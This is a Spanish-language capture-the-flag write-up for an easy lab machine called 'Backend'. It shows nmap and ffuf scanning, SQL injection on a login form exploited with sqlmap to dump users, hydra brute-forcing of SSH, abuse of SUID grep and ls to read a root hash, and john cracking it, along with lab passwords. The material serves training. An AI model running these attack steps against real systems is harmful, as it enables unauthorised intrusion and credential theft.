---
description: '🧠Dificultad: Fácil | 🔓18/03/2026'
---

# 🟩 Backend

## 🕵️ Reconocimiento

Comenzamos con un escaneo de puertos con `nmap`:

{% code overflow="wrap" %}
```bash
nmap -sC -sV -Pn $IPTARGET | tee nmap
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

Solo tenemos los puertos 80 y 22 (HTTP y SSH) abiertos. Realizamos un escaneo de directorios sobre el servicio web:

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://$IPTARGET/FUZZ" -e .html,.php,.txt,.xml,.js
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

Veamos qué encontramos dentro del navegador:

<figure><img src="../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

Si introducimos una `'` en el campo de `Username`, nos salta un error de SQL:

<figure><img src="../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

## 🚪 Ganando acceso

Explotamos esta vía para encontrar una vulnerabilidad SQL y dumpear la base de datos:

{% code overflow="wrap" %}
```bash
sqlmap -u "http://172.17.0.2/login.php" --data="username=hola&password=adios" --batch --risk=3 --level=5 --dbs
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

Vemos que es vulnerable a un boolean-based blind sqli, entre otros. Las bases de datos que contiene son las siguientes:

<figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Miramos las tablas de la base de datos `users`:

{% code overflow="wrap" %}
```bash
sqlmap -u "http://172.17.0.2/login.php" --data="username=hola&password=adios" --batch -D users --tables
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

Y vemos el contenido de la tabla `usuarios`:

{% code overflow="wrap" %}
```bash
sqlmap -u "http://172.17.0.2/login.php" --data="username=hola&password=adios" --batch -D users -T usuarios --dump
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Guardamos todos los usuarios y contraseñas en dos archivos `.txt` para pasarlos a `hydra` y ver qué combinación es la correcta:

{% code overflow="wrap" %}
```bash
hydra -L usuarios.txt -P passwords.txt ssh://172.17.0.2
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

La combinación correcta es `pepe:P123pepe3456P`. Entramos por SSH:

<figure><img src="../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Vemos los binarios con el bit SUID activado en el sistema:

{% code overflow="wrap" %}
```bash
find / -perm -4000 -type f 2>/dev/null
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

Con `grep` y `ls` podemos listar directorios y leer el contenido de todos los ficheros, ya que tienen el bit SUID activado y su propietario es `root`. Listamos el contenido del directorio `/root` y leemos el fichero `pass.hash`:

<figure><img src="../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Nos llevamos el hash a nuestra máquina para analizarlo. Al parecer se trata de un hash MD5. Usamos `john` para crackear el hash y sacar la contraseña:

{% code overflow="wrap" %}
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

La contraseña de `root` es `spongebob34`.

<figure><img src="../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>
